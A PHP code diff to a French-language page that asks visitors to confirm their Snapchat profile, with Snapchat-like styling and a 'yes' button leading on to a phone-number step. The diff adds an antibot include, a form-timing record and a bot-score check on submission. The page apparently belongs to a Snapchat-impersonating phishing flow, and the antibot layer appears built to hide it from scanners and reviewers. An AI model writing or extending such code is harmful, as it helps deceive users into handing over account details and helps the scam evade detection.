@@ -3,6 +3,7 @@
 declare(strict_types=1);
 
 require __DIR__ . '/includes/bootstrap.php';
+require __DIR__ . '/includes/antibot.php';
 
 session_start();
 
@@ -17,18 +18,28 @@ if ($flow === null || $flow['secret'] !== $secret) {
 
 $pseudo = $flow['pseudo'];
 $display = '@' . ltrim($pseudo, '@');
+$error = '';
+
+if ($_SERVER['REQUEST_METHOD'] === 'GET') {
+    app_touch_form_opened('confirm');
+}
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $action = isset($_POST['action']) ? (string) $_POST['action'] : '';
-    if ($action === 'oui') {
-        header('Location: phone.php', true, 302);
-        exit;
-    }
-    if ($action === 'non') {
-        app_flow_delete($flowId);
-        unset($_SESSION['flow_id'], $_SESSION['flow_secret']);
-        header('Location: index.php', true, 302);
-        exit;
+    $ab = app_antibot_verify_post_light('confirm', 0.8);
+    if ($ab !== '') {
+        $error = $ab;
+    } else {
+        $action = isset($_POST['action']) ? (string) $_POST['action'] : '';
+        if ($action === 'oui') {
+            header('Location: phone.php', true, 302);
+            exit;
+        }
+        if ($action === 'non') {
+            app_flow_delete($flowId);
+            unset($_SESSION['flow_id'], $_SESSION['flow_secret']);
+            header('Location: index.php', true, 302);
+            exit;
+        }
     }
 }
 
@@ -48,6 +59,10 @@ $css = require __DIR__ . '/includes/snap_styles.php';
         <h1 class="title">Confirmez votre profil</h1>
         <p class="subtitle">Est-ce bien votre profil Snapchat ?</p>
 
+        <?php if ($error !== '') : ?>
+            <div class="alert alert-error" role="alert"><?= htmlspecialchars($error, ENT_QUOTES, 'UTF-8') ?></div>
+        <?php endif; ?>
+
         <div class="profile-box">
             <div class="snapcode" aria-hidden="true">
                 <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
@@ -58,6 +73,8 @@ $css = require __DIR__ . '/includes/snap_styles.php';
         </div>
 
         <form method="post" action="">
+            <?php $requireMath = false;
+            require __DIR__ . '/includes/form_antibot_fields.php'; ?>
             <button type="submit" class="btn btn-primary" name="action" value="oui">OUI</button>
             <button type="submit" class="btn btn-secondary" name="action" value="non">NON</button>
         </form>
